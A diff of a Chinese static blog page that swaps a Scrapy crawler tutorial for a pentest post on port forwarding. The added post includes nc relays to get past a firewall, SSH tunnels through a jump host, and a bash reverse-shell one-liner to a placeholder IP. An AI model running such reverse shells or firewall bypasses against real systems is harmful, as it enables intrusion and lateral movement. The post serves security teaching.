@@ -17,21 +17,21 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>爬虫之Scrapy | Hexo</title>
-  <meta name="description" content="Scrapy 是一个基于Twisted的异步处理框架，是纯 Python 实现的爬虫框架，其架构清晰，模块之间的耦合程度低，可扩展性极强，可以灵活完成各种需求。而且它属于一种全家桶式的框架，在架构上很特别，都是基于插件式的增量开发模式，并行运行能力非常出众。 1、Scrapy的安装 Linux平台上直接pip install scrapy  Windows平台上需要先安装Twisted。首先下载T">
+  <title>渗透之端口转发 | Hexo</title>
+  <meta name="description" content="端口转发在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很好的解决下列问题：  对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙 对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台机器进行端口转发，接">
 <meta property="og:type" content="article">
-<meta property="og:title" content="爬虫之Scrapy">
-<meta property="og:url" content="http://yejuns.github.io/2020/06/21/%E7%88%AC%E8%99%AB%E4%B9%8BScrapy/index.html">
+<meta property="og:title" content="渗透之端口转发">
+<meta property="og:url" content="http://yejuns.github.io/2021/01/22/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.html">
 <meta property="og:site_name" content="风景这边独好">
-<meta property="og:description" content="Scrapy 是一个基于Twisted的异步处理框架，是纯 Python 实现的爬虫框架，其架构清晰，模块之间的耦合程度低，可扩展性极强，可以灵活完成各种需求。而且它属于一种全家桶式的框架，在架构上很特别，都是基于插件式的增量开发模式，并行运行能力非常出众。 1、Scrapy的安装 Linux平台上直接pip install scrapy  Windows平台上需要先安装Twisted。首先下载T">
+<meta property="og:description" content="端口转发在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很好的解决下列问题：  对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙 对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台机器进行端口转发，接">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-06-21T08:01:51.000Z">
-<meta property="article:modified_time" content="2021-07-18T15:25:08.377Z">
+<meta property="article:published_time" content="2021-01-22T08:01:51.000Z">
+<meta property="article:modified_time" content="2021-08-08T03:00:43.702Z">
 <meta property="article:author" content="Ye-Jun">
-<meta property="article:tag" content="爬虫">
+<meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://yejuns.github.io/2020/06/21/%E7%88%AC%E8%99%AB%E4%B9%8BScrapy/index.html">
+  <link rel="canonical" href="http://yejuns.github.io/2021/01/22/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.html">
   
     <link rel="alternate" href="/atom.xml" title="风景这边独好" type="application/atom+xml">
   
@@ -222,7 +222,7 @@
   <div class="widget">
     <h3 class="widget-title">标签</h3>
     <div class="widget-body">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android%E9%80%86%E5%90%91/" rel="tag">Android逆向</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E5%AE%89%E5%85%A8/" rel="tag">Linux安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SqlMap/" rel="tag">SqlMap</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo%E4%BD%BF%E7%94%A8/" rel="tag">hexo使用</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javaScript/" rel="tag">javaScript</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%8B%E8%AF%95/" rel="tag">测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" rel="tag">计算机基础</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a><span class="tag-list-count">2</span></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android%E9%80%86%E5%90%91/" rel="tag">Android逆向</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E5%AE%89%E5%85%A8/" rel="tag">Linux安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SqlMap/" rel="tag">SqlMap</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo%E4%BD%BF%E7%94%A8/" rel="tag">hexo使用</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javaScript/" rel="tag">javaScript</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%8B%E8%AF%95/" rel="tag">测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" rel="tag">计算机基础</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a><span class="tag-list-count">2</span></li></ul>
     </div>
   </div>
 
@@ -241,7 +241,7 @@
   <div class="widget">
     <h3 class="widget-title">归档</h3>
     <div class="widget-body">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -305,7 +305,7 @@
                 
               </p>
               <p class="item-title">
-                <a href="/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B9%9D%E8%AF%BE/" class="title">Android逆向第九课 - IDA+frida联合调试</a>
+                <a href="/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/" class="title">Android逆向第十课 - IDA+frida联合调试</a>
               </p>
               <p class="item-date">
                 <time datetime="2021-04-18T06:01:51.000Z" itemprop="datePublished">2021-04-18</time>
@@ -341,14 +341,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="post-爬虫之Scrapy" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-渗透之端口转发" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      爬虫之Scrapy
+      渗透之端口转发
     </h1>
   
 
@@ -356,80 +356,49 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2020/06/21/%E7%88%AC%E8%99%AB%E4%B9%8BScrapy/" class="article-date">
-	  <time datetime="2020-06-21T08:01:51.000Z" itemprop="datePublished">2020-06-21</time>
+	<a href="/2021/01/22/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="article-date">
+	  <time datetime="2021-01-22T08:01:51.000Z" itemprop="datePublished">2021-01-22</time>
 	</a>
 </span>
         
         
   <span class="article-tag">
     <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a>
+	<a class="article-tag-link-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
   </span>
 
 
         
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/06/21/%E7%88%AC%E8%99%AB%E4%B9%8BScrapy/#comments" class="article-comment-link">评论</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/01/22/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/#comments" class="article-comment-link">评论</a></span>
         
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <p>Scrapy 是一个基于Twisted的异步处理框架，是纯 Python 实现的爬虫框架，其架构清晰，模块之间的耦合程度低，可扩展性极强，可以灵活完成各种需求。<br>而且它属于一种全家桶式的框架，在架构上很特别，都是基于插件式的增量开发模式，并行运行能力非常出众。</p>
-<h2 id="1、Scrapy的安装"><a href="#1、Scrapy的安装" class="headerlink" title="1、Scrapy的安装"></a>1、Scrapy的安装</h2><ol>
-<li><p>Linux平台上直接<code>pip install scrapy</code></p>
-</li>
-<li><p>Windows平台上需要先安装<code>Twisted</code>。首先下载Twisted的<code>whl</code>包，<a target="_blank" rel="noopener" href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted">下载地址</a>,选择和你的windows系统一致的版本，然后进入下载的目录，执行以下指令</p>
-<blockquote>
-<p>D:\tmp&gt; pip install .\Twisted-20.3.0-cp39-cp39-win32.whl</p>
-</blockquote>
-<p>安装完成后，就可以执行<code>pip install scrapy</code>。</p>
-<p>完成安装后在命令行执行，<code>scrapy -h</code>,如果能正常输出scrapy的命令帮助信息则表明安装成功.</p>
-<p>如果安装完成后在运行scrapy项目时报以下的错</p>
-<blockquote>
-<p>no module named win32api</p>
-</blockquote>
-<p>则表示Windows系统中，python因为原生并不能访问windows的api，所以需要额外安装pypiwin32库,<code>pip install pypiwin32</code></p>
-</li>
+        <h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很好的解决下列问题：</p>
+<ol>
+<li>对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙</li>
+<li>对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台机器进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口</li>
 </ol>
-<h2 id="2、scrapy-项目结构"><a href="#2、scrapy-项目结构" class="headerlink" title="2、scrapy 项目结构"></a>2、scrapy 项目结构</h2><p>scrapy 的项目对目录结构有严格要求，为了简化这个构建指定目录的重复性过程，我们可以使用scrapy内置的<code>startproject</code>指令来快速构建scrapy项目。<br>比如，我们创建第一个爬虫项目<code>test1</code></p>
-<blockquote>
-<p>scrapy startproject test1</p>
-</blockquote>
-<p>项目生成后，展开”test1”目录可以看到以下的目录结构：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">test1</span><br><span class="line">├── test1 # 爬虫项目包目录</span><br><span class="line">│ ├── __init__.py</span><br><span class="line">│ ├── items.py # Item定义文件</span><br><span class="line">│ ├── middlewares.py # 自定义中间件</span><br><span class="line">│ ├── pipelines.py # 自定义管道</span><br><span class="line">│ ├── settings.py # 项目配置文件</span><br><span class="line">│ └── spiders # 蜘蛛类的存放目录</span><br><span class="line">│ └── __init__.py</span><br><span class="line">└── scrapy.cfg # Scrapy 运行配置文件</span><br></pre></td></tr></table></figure>
-<h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><p>Scrapy 提供的全局命令(只能在 Scrapy 项目目录之外运行)主要包括以下这些:</p>
-<ul>
-<li>scrapy startproject &lt;项目名&gt; - 初始化爬虫项目，创建基本目录与必要的文件</li>
-<li>scrapy runspider &lt;spider_file.py&gt; - 在未创建项目的情况下，运行一个编写在Python文件中的spider</li>
-<li>scrapy fetch <url> - 使用Scrapy下载器(downloader)下载给定的URL，并将获取到的内容打印到控制台上</li>
-<li>scrapy view <url> - 在浏览器中打开给定的URL，并用一个Scrapy spider获取目标URL，并将结构显示到浏览器中。</li>
-</ul>
-<p>Scrapy 提供的项目（Project-only）命令是必须先进入项目目录后才能使用的命令:</p>
-<ul>
-<li>scrapy crawl &lt;蜘蛛名&gt; - 使用指定的蜘蛛执行爬取</li>
-<li>scrapy genspider - 在当前项目中创建spider。这仅仅是创建spider的一种快捷方法。该方法可以使用提前定义好的模板来生成spider。</li>
-<li>scrapy bench - 运行benchmark测试</li>
-<li>scrapy deploy [ <a href="target:project">target:project</a> | -l <target> | -L ] - 将项目部署到Scrapyd服务</li>
-</ul>
-<p><code>genspider</code> 指令是最为常用的，顾名思义它就是用来帮助我们生成蜘蛛代码框架构。</p>
-<p>它的指令结构如下:</p>
-<blockquote>
-<p>scrapy genspider [-t 模板名] &lt;蜘蛛名&gt; &lt;域&gt;</p>
-</blockquote>
-<p>模板名参数提供以下4种常用的蜘蛛模板：</p>
-<ul>
-<li>basic - 默认，创建基本的蜘蛛</li>
-<li>crawl - 创建基于CrawlSpider 的蜘蛛</li>
-<li>csvfeed - 创建基于CsvFeedSpider 的蜘蛛</li>
-<li>xmlfeed - 创建基于XmlFeedSpider 的蜘蛛</li>
-</ul>
-<p>创建一个爬取新浪新闻的普通蜘蛛:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider news http:&#x2F;&#x2F;www.sina.com</span><br></pre></td></tr></table></figure>
-<p>当指令执行成功后就会在 [项目名]/[项目名]/spiders/ 目录下找到一个news.py 的蜘蛛源码文件</p>
-<p>打开new.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewsSpider</span>(<span class="params">scrapy.Spider</span>):</span> <span class="comment"># 生成蜘蛛后Scrapy会将蜘蛛名首字母大写并在其后加Spider作为蜘蛛的类名</span></span><br><span class="line">  name = <span class="string">&#x27;news&#x27;</span> <span class="comment"># 蜘蛛名</span></span><br><span class="line">  allowed_domains = [<span class="string">&#x27;http://www.sina.com&#x27;</span>] <span class="comment"># 在genspider指定的域</span></span><br><span class="line">  start_urls = [<span class="string">&#x27;http://http://www.sina.com/&#x27;</span>]</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>常用的方法有</p>
+<p><code>nc、lcx、socks、bash反弹、MSF后门反弹、frp</code></p>
+<h2 id="nc端口转发"><a href="#nc端口转发" class="headerlink" title="nc端口转发"></a>nc端口转发</h2><p>背景：192.168.50.1的用户ye需要访问192.168.50.2的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前ye用户只能访问192.168.50.2的9000端口。需要9000端口做转发。 </p>
+<ol>
+<li>在192.168.50.2上开启8000端口<br><code>nc -l 8000</code></li>
+<li>在192.168.50.2上实现9000端口转发<br><code>cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo</code></li>
+<li>在192.168.50.1上连接192.168.50.2的9000端口<br><code>nc -vn 192.168.50.2 9000</code></li>
+</ol>
+<h2 id="Shell命令实现端口转发"><a href="#Shell命令实现端口转发" class="headerlink" title="Shell命令实现端口转发"></a>Shell命令实现端口转发</h2><ol>
+<li>部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li>
+<li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 9987:10.154.62.197:3306 root@localhost </span><br><span class="line"><span class="meta">#</span><span class="bash"> 9987是本地创建的一个端口要把10.154.62.197服务器上的3306端口映射到本地的9987</span></span><br><span class="line">ssh -CfNg -R 1521:127.0.0.1:6300 root@localhost</span><br><span class="line"><span class="meta">#</span><span class="bash"> 作用同上, 只是在远程主机172.16.1.164上打开1521端口, 来映射本机的6300端口.</span></span><br></pre></td></tr></table></figure>
+案例：有A,B,C 3台服务器, A,C有公网IP, B是某IDC的服务器无公网IP. A通过B连接C的80端口(A&lt;=&gt;B&lt;=&gt;C), 那么在B上执行如下命令即可:</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 6300:127.0.0.1:80 userc@C</span><br><span class="line"></span><br><span class="line">ssh -CfNg -R 80:127.0.0.1:6300 usera@A</span><br></pre></td></tr></table></figure>
+<p>服务器A和服务器C之间, 利用跳板服务器B建立了加密隧道. 在A上连接127.0.0.1:80, 就等同C上的80端口. 需要注意的是, 服务器B上的6300端口的数据没有加密, 可被监听, 例:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -s 0 -i lo port 6300</span><br></pre></td></tr></table></figure>
+
+
       
     </div>
     <div class="article-footer">
@@ -438,7 +407,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://yejuns.github.io/2020/06/21/%E7%88%AC%E8%99%AB%E4%B9%8BScrapy/" title="爬虫之Scrapy" target="_blank" rel="external">http://yejuns.github.io/2020/06/21/%E7%88%AC%E8%99%AB%E4%B9%8BScrapy/</a>
+      <a href="http://yejuns.github.io/2021/01/22/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" title="渗透之端口转发" target="_blank" rel="external">http://yejuns.github.io/2021/01/22/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -485,12 +454,12 @@
   <ul class="pager pull-left">
     
     <li class="prev">
-      <a href="/2020/07/11/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%BA%94%E8%AF%BE/" title="Android逆向第五课 - frida （上）"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+      <a href="/2021/02/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B8%83%E8%AF%BE/" title="Android逆向第七课 - IDA静态分析"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
     </li>
     
     
     <li class="next">
-      <a href="/2020/06/20/MergeTree%E8%A7%A3%E6%9E%90/" title="MergeTree解析"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/" title="Linux 中的安全模型"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
